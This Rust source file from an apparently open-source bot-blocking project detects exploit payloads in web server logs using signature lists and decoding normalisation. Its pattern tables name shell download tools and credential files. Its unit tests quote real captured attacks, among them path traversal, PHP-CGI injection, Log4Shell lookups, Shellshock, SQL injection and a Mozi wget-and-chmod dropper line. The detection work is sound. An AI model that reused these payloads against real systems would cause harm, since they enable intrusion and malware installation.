/*  This file is part of the stop-bots project.
 *
 *  Copyright (C) 2026 Marko Ivankovic
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU Affero General Public License as published
 *  by the Free Software Foundation, version 3 of the License.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU Affero General Public License for more details.
 *
 *  You should have received a copy of the GNU Affero General License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

//! Recognising an exploit payload in a logged request.
//!
//! Signatures, not a regex engine: this crate deliberately carries none,
//! because the `regex` crate would add about 1.5 MB to a statically linked
//! musl binary. What makes the signatures hold up is the normalisation in
//! front of them. A payload arrives percent-encoded, double-encoded, as `%%32%65` (which
//! one decoding pass turns into `%2e` and the next into `.`), as IIS's
//! `%u002e`, as full-width `．`, and inside NGINX's own `\xHH` log
//! escapes. [`normalize`] undoes all of those until the text stops
//! changing, and lowercases it; each signature is then a substring.
//!
//! ## Two strengths
//!
//! **Strong** signatures are shapes no person produces by typing or
//! clicking: Shellshock's `() { :;};`, a Log4Shell `${jndi:` lookup, OGNL,
//! the PHP-CGI `allow_url_include` exploit, `$(wget …)`, a NUL byte,
//! `../../`. They count anywhere — request line, user agent, referer.
//!
//! **Weak** signatures are also plain text a person might type:
//! `/etc/passwd`, `union select`, `<script`, `/bin/sh`. Someone searching
//! a Linux blog for `/etc/passwd` sends `/?s=/etc/passwd`, and a search
//! engine's referer can carry the same query. So a weak signature counts
//! only in the path, in query parameters that are not a search box (see
//! [`SEARCH_PARAMS`]), and in the user agent — never in the referer.
//!
//! ## Evidence
//!
//! Five months of one host's log, 451,228 requests: these signatures
//! matched 19,311 requests from 716 addresses. The 20 of those addresses
//! that had also fetched ordinary pages were, on inspection, all scanners
//! — their "browsing" was `/?phpinfo=-1` and `/?pp=env` under rotating
//! browser user agents — and none had ever logged in over SSH.

/// Query parameters that carry what a person typed into a search box.
/// Only strong signatures count inside their values.
pub const SEARCH_PARAMS: &[&str] = &[
    "s",
    "q",
    "query",
    "search",
    "searchterm",
    "keyword",
    "keywords",
    "term",
];

/// Shapes no person types, matched against the normalised text with
/// whitespace removed (see [`squash`]).
const STRONG: &[(&str, &[&str])] = &[
    // Log4Shell and its obfuscations: `${${env:NaN:-j}ndi…}`, `${::-j}`.
    (
        "log4shell",
        &[
            "${jndi",
            "${${",
            "${env:",
            "${lower:",
            "${upper:",
            "${::-",
            "${sys:",
            "${date:",
            "${java:",
            "${base64:",
        ],
    ),
    // Struts OGNL, Spring and generic expression-language injection.
    (
        "expression injection",
        &[
            "${(#",
            "%{(#",
            "%{#",
            "#_memberaccess",
            "@java.lang.runtime",
            "getruntime().exec",
            "java.lang.processbuilder",
            "${@",
            "#context[",
        ],
    ),
    // CVE-2024-4577 and its predecessors: PHP-CGI argument injection.
    (
        "php-cgi argument injection",
        &[
            "allow_url_include",
            "auto_prepend_file",
            "php://input",
            "php://filter",
            "data://text/plain;base64",
            "expect://",
            "pearcmd",
        ],
    ),
    // A shell command substituted or chained into a parameter.
    (
        "command injection",
        &[
            "$(wget", "$(curl", "$(echo", "$(id)", "$(pwd)", "$(cat", "$(whoami", "$(uname",
            "`wget", "`curl", "`id`", ";wget", ";curl", "|wget", "|curl", "&&wget", "&&curl",
        ],
    ),
];

/// Also plain text a person might type — counted outside search boxes
/// and referers only. Matched against the squashed text too.
const WEAK: &[(&str, &[&str])] = &[
    (
        "sensitive file",
        &[
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "win.ini",
            "boot.ini",
        ],
    ),
    (
        "sql injection",
        &[
            "unionselect",
            "unionallselect",
            "pg_sleep(",
            "waitfordelay",
            "information_schema",
            "extractvalue(",
            "updatexml(",
            "'or'1'='1",
            "'or1=1",
        ],
    ),
    (
        "script injection",
        &[
            "<script",
            "javascript:",
            "onerror=",
            "onload=",
            "<svg/onload",
        ],
    ),
    (
        "code injection",
        &[
            "<?php",
            "<?=",
            "shell_exec(",
            "passthru(",
            "base64_decode(",
            "/bin/sh",
            "/bin/bash",
            "busybox",
            "wgethttp",
            "curlhttp",
        ],
    ),
];

/// Which signature, if any, a request carries.
///
/// `request` is the request line as logged (`GET /a?b=1 HTTP/1.1`), whole:
/// some payloads replace the method itself. `referer` is `None` when the
/// log format does not record one.
///
/// The three fields are judged independently, which is what lets a caller
/// scanning a whole log remember the answer for each distinct value — see
/// `accesslog::injection_ips`.
pub fn signature(request: &str, user_agent: &str, referer: Option<&str>) -> Option<&'static str> {
    in_request(request)
        .or_else(|| in_user_agent(user_agent))
        .or_else(|| referer.and_then(in_referer))
}

/// A signature in the request line: strong ones anywhere in it, weak ones
/// in the path and every query parameter that is not a search box.
pub fn in_request(request: &str) -> Option<&'static str> {
    if let Some(found) = raw_signature(request) {
        return Some(found);
    }
    if let Some(found) = strong(&normalize(request)) {
        return Some(found);
    }
    let target = target_of(request);
    let (path, query) = target.split_once('?').unwrap_or((target, ""));
    if let Some(found) = weak(&normalize(path)) {
        return Some(found);
    }
    for pair in query.split('&') {
        let key = normalize(pair.split('=').next().unwrap_or(""));
        if SEARCH_PARAMS.contains(&key.trim()) {
            continue;
        }
        if let Some(found) = weak(&normalize(pair)) {
            return Some(found);
        }
    }
    None
}

/// A signature in the user agent: a named CVE, or any strong or weak one.
pub fn in_user_agent(user_agent: &str) -> Option<&'static str> {
    if names_a_cve(user_agent) {
        return Some("exploit announced by cve");
    }
    let text = normalize(user_agent);
    strong(&text).or_else(|| weak(&text))
}

/// A signature in the referer: strong ones only, because a search engine's
/// referer carries whatever a person searched for.
pub fn in_referer(referer: &str) -> Option<&'static str> {
    strong(&normalize(referer))
}

/// The target of a logged request line: everything between the method
/// and the protocol. Not the second whitespace-separated word — a
/// scanner's `GET /?id=-1 UNION SELECT 1,2,3-- HTTP/1.1` is logged with
/// its spaces, and the payload is everything after the first of them.
fn target_of(request: &str) -> &str {
    let rest = request.split_once(' ').map_or(request, |(_, rest)| rest);
    match rest.rsplit_once(' ') {
        Some((target, protocol)) if protocol.starts_with("HTTP/") => target,
        _ => rest,
    }
}

/// What only the undecoded text shows: an encoded NUL or CRLF. Checked
/// before decoding because decoding turns them into characters that the
/// rest of this module would have to special-case.
fn raw_signature(request: &str) -> Option<&'static str> {
    let lower = request.to_ascii_lowercase();
    if lower.contains("%00") {
        return Some("nul byte");
    }
    if lower.contains("%0d%0a") {
        return Some("header injection");
    }
    None
}

fn strong(text: &str) -> Option<&'static str> {
    if text.matches("../").count() >= 2 || text.matches("..\\").count() >= 2 {
        return Some("path traversal");
    }
    let squashed = squash(text);
    if squashed.contains("(){") && (squashed.contains(":;") || squashed.contains(";}")) {
        return Some("shellshock");
    }
    matching(&squashed, STRONG)
}

fn weak(text: &str) -> Option<&'static str> {
    let squashed = squash(text);
    if let Some(found) = matching(&squashed, WEAK) {
        return Some(found);
    }
    if sleeps(&squashed) {
        return Some("sql injection");
    }
    if template_arithmetic(&squashed) {
        return Some("template injection");
    }
    None
}

fn matching(squashed: &str, table: &[(&'static str, &[&str])]) -> Option<&'static str> {
    table
        .iter()
        .find(|(_, needles)| needles.iter().any(|needle| squashed.contains(needle)))
        .map(|(name, _)| *name)
}

/// `sleep(5)` or `benchmark(5000000,…)`: a time-based SQL probe. The digit
/// is what separates it from a page about sleep.
fn sleeps(squashed: &str) -> bool {
    ["sleep(", "benchmark("].iter().any(|call| {
        squashed.match_indices(call).any(|(at, _)| {
            squashed[at + call.len()..]
                .chars()
                .next()
                .is_some_and(|c| c.is_ascii_digit())
        })
    })
}

/// `{{7*7}}`: the canonical server-side template probe. Arithmetic
/// specifically, because a broken site template can make a real browser
/// request a literal `{{image}}`.
fn template_arithmetic(squashed: &str) -> bool {
    squashed.match_indices("{{").any(|(at, _)| {
        let rest = &squashed[at + 2..];
        let digits = |s: &str| s.chars().take_while(|c| c.is_ascii_digit()).count();
        let left = digits(rest);
        left > 0 && rest[left..].starts_with('*') && {
            let right = digits(&rest[left + 1..]);
            right > 0 && rest[left + 1 + right..].starts_with("}}")
        }
    })
}

/// `CVE-2023-20198` in a user agent: a client announcing which exploit it
/// is about to try. Checked on the undecoded text; there is nothing to
/// decode in a name.
fn names_a_cve(user_agent: &str) -> bool {
    let lower = user_agent.to_ascii_lowercase();
    lower.match_indices("cve-").any(|(at, _)| {
        let rest = &lower.as_bytes()[at + 4..];
        rest.len() >= 6
            && rest[..4].iter().all(u8::is_ascii_digit)
            && rest[4] == b'-'
            && rest[5].is_ascii_digit()
    })
}

/// Undoes every encoding a payload hides behind, then lowercases.
///
/// NGINX's `\xHH` log escapes first, then percent-decoding — `%HH` and
/// IIS's `%uHHHH` — repeated until the text stops changing, which is what
/// takes `%252e` and `%%32%65` down to `.` without special cases. At most
/// four rounds: a real payload needs two or three, and a bound keeps a
/// pathological input from looping. Full-width `．／＼` become their ASCII
/// selves last, because a decoded `%uff0e` produces one.
pub fn normalize(text: &str) -> String {
    let mut current = unescape_log(text);
    for _ in 0..4 {
        let decoded = percent_decode(&current);
        if decoded == current {
            break;
        }
        current = decoded;
    }
    current
        .chars()
        .map(|c| match c {
            '\u{ff0e}' => '.',
            '\u{ff0f}' => '/',
            '\u{ff3c}' => '\\',
            other => other,
        })
        .collect::<String>()
        .to_lowercase()
}

/// Whitespace and `+` removed, and SQL's `/**/` comment-as-space with them,
/// so `union/**/select`, `union+select` and `union  select` read alike.
fn squash(text: &str) -> String {
    text.replace("/**/", "")
        .chars()
        .filter(|c| !c.is_whitespace() && *c != '+')
        .collect()
}

/// NGINX writes a byte it will not log verbatim as `\xHH`.
fn unescape_log(text: &str) -> String {
    if !text.contains("\\x") {
        return text.to_string();
    }
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' && bytes.get(i + 1) == Some(&b'x') {
            if let Some(byte) = hex_byte(bytes.get(i + 2..i + 4)) {
                out.push(byte);
                i += 4;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn percent_decode(text: &str) -> String {
    if !text.contains('%') {
        return text.to_string();
    }
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            if let Some(byte) = hex_byte(bytes.get(i + 1..i + 3)) {
                out.push(byte);
                i += 3;
                continue;
            }
            if matches!(bytes.get(i + 1), Some(b'u' | b'U')) {
                let unit = bytes
                    .get(i + 2..i + 6)
                    .and_then(|h| std::str::from_utf8(h).ok())
                    .and_then(|h| u32::from_str_radix(h, 16).ok())
                    .and_then(char::from_u32);
                if let Some(c) = unit {
                    let mut buf = [0; 4];
                    out.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
                    i += 6;
                    continue;
                }
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hex_byte(pair: Option<&[u8]>) -> Option<u8> {
    let pair = std::str::from_utf8(pair?).ok()?;
    if pair.len() != 2 || !pair.bytes().all(|b| b.is_ascii_hexdigit()) {
        return None;
    }
    u8::from_str_radix(pair, 16).ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    const BROWSER: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
                           (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

    fn request(line: &str) -> Option<&'static str> {
        signature(line, BROWSER, Some("-"))
    }

    /// Straight from the log the signatures were read off. A future
    /// "tidying" has to answer for each of these.
    #[test]
    fn every_payload_seen_on_a_real_host_is_recognised() {
        let seen: &[(&str, &str)] = &[
            (
                "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1",
                "path traversal",
            ),
            (
                "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1",
                "path traversal",
            ),
            (
                "GET https://example.com/%uff0e%uff0e/%uff0e%uff0e/etc/passwd HTTP/1.1",
                "path traversal",
            ),
            (
                "GET /..%5c..%5c..%5c..%5cvar/log/apache2/access.log HTTP/1.1",
                "path traversal",
            ),
            (
                "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1",
                "path traversal",
            ),
            (
                "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1",
                "php-cgi argument injection",
            ),
            (
                "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input \
                 HTTP/1.1",
                "php-cgi argument injection",
            ),
            (
                "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write\
                 &country=$(wget%20http%3A//0.0.0.0/router.tplink.sh) HTTP/1.1",
                "command injection",
            ),
            ("GET /$(pwd)/.env HTTP/1.1", "command injection"),
            (
                "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m",
                "command injection",
            ),
            (
                "GET /?x=t%28%27%24%7B%24%7Benv%3ANaN%3A-j%7Dndi%24%7Benv%3ANaN%3A-%3A%7D HTTP/1.1",
                "log4shell",
            ),
            (
                "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28\
                 %40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%29%7D HTTP/1.1",
                "expression injection",
            ),
            (
                "GET /index.php/module/action/param1/$%7B@print%28env%29%7D HTTP/1.1",
                "expression injection",
            ),
            ("GET /.env%00 HTTP/1.1", "nul byte"),
            ("GET /.env%0d%0a?_=ipitw9lt HTTP/1.1", "header injection"),
            ("GET /@fs/proc/self/environ?import&raw?? HTTP/1.1", "sensitive file"),
            ("GET /?file=/etc/passwd HTTP/1.1", "sensitive file"),
            ("GET /?id=-1 UNION SELECT 1,2,3-- HTTP/1.1", "sql injection"),
            (
                "GET /community/recent/?wpfob=(SELECT/**/1/**/FROM/**/(SELECT/**/SLEEP(8))a) HTTP/1.1",
                "sql injection",
            ),
            ("GET /?id=1' OR '1'='1 HTTP/1.1", "sql injection"),
        ];
        for (line, expected) in seen {
            assert_eq!(request(line), Some(*expected), "{line}");
        }
    }

    #[test]
    fn a_payload_in_the_user_agent_or_referer_is_recognised() {
        assert_eq!(
            signature(
                "GET /cgi-bin/status HTTP/1.1",
                "() { :;}; echo; /bin/sh -c 'echo SHELLSHOCK_CANARY_b6713c3f'",
                Some("-"),
            ),
            Some("shellshock")
        );
        assert_eq!(
            signature(
                "GET / HTTP/1.1",
                BROWSER,
                Some("() { :;}; echo; echo GSCAN_SHK"),
            ),
            Some("shellshock")
        );
        assert_eq!(
            signature("GET / HTTP/1.1", "CVE-2023-20198", Some("-")),
            Some("exploit announced by cve")
        );
        assert_eq!(
            signature(
                "GET / HTTP/1.1",
                "metabase-cve-2026-72898-detect/1.0 (benign detection probes only)",
                None,
            ),
            Some("exploit announced by cve")
        );
    }

    /// Ordinary traffic, including the near misses that shaped the
    /// signatures.
    #[test]
    fn ordinary_requests_are_not_mistaken_for_payloads() {
        let ordinary = [
            "GET / HTTP/2.0",
            "GET /blog/how-to-secure-your-env/ HTTP/2.0",
            "GET /images/marko_hu_4323268953f756aa.webp HTTP/2.0",
            "GET /css/bundle.min.18d1bf1e8f0f2d0cffe155f7.css HTTP/2.0",
            // One level up is something a relative link can produce.
            "GET /docs/../index.html HTTP/1.1",
            "GET /search?q=reunion+selection HTTP/2.0",
            "GET /?utm_source=newsletter&utm_medium=email%20campaign HTTP/2.0",
            "GET /%E2%82%AC-prices/ HTTP/2.0",
            "GET /posts/sleep-better/ HTTP/2.0",
            "GET /shop?tags=a|shoes HTTP/2.0",
            // An unrendered template in a broken page is not an attack.
            "GET /assets/{{image}} HTTP/2.0",
            "GET /api/items/${id} HTTP/2.0",
            "POST /wp-admin/admin-ajax.php HTTP/2.0",
        ];
        for line in ordinary {
            assert_eq!(request(line), None, "{line}");
        }
    }

    /// Someone searching a Linux or SQL blog types exactly these, and a
    /// search engine's referer can carry the query.
    #[test]
    fn a_weak_signature_in_a_search_box_or_referer_does_not_count() {
        for line in [
            "GET /?s=%2Fetc%2Fpasswd HTTP/2.0",
            "GET /search?q=union+select+example HTTP/2.0",
            "GET /?query=%3Cscript%3E+tag HTTP/2.0",
            "GET /?keyword=what+is+%2Fbin%2Fsh HTTP/2.0",
        ] {
            assert_eq!(request(line), None, "{line}");
        }
        assert_eq!(
            signature(
                "GET /posts/sql/ HTTP/2.0",
                BROWSER,
                Some("https://search.example/?q=union+select+tutorial"),
            ),
            None
        );
    }

    /// But a strong one counts wherever it is: nobody searches for a
    /// Log4Shell lookup.
    #[test]
    fn a_strong_signature_counts_even_in_a_search_box() {
        assert_eq!(
            request("GET /?s=${jndi:ldap://203.0.113.9/a} HTTP/1.1"),
            Some("log4shell")
        );
        assert_eq!(
            signature(
                "GET / HTTP/1.1",
                BROWSER,
                Some("https://example.com/?q=${jndi:ldap://203.0.113.9/a}"),
            ),
            Some("log4shell")
        );
    }

    #[test]
    fn normalize_undoes_every_layer() {
        assert_eq!(normalize("%%32%65%%32%65"), "..");
        assert_eq!(normalize("%252e%252e%252f"), "../");
        assert_eq!(normalize("%u002e%u002e"), "..");
        assert_eq!(normalize("%uff0e%uff0e%uff0f"), "../");
        assert_eq!(normalize("\\x22%24%7BJNDI"), "\"${jndi");
        // Not an escape: left alone rather than guessed at.
        assert_eq!(normalize("100%zz"), "100%zz");
    }

    #[test]
    fn template_arithmetic_needs_the_whole_shape() {
        assert!(template_arithmetic("{{7*7}}"));
        assert!(template_arithmetic("/?name={{1337*1337}}"));
        assert!(!template_arithmetic("{{7*}}"));
        assert!(!template_arithmetic("{{image}}"));
    }
}
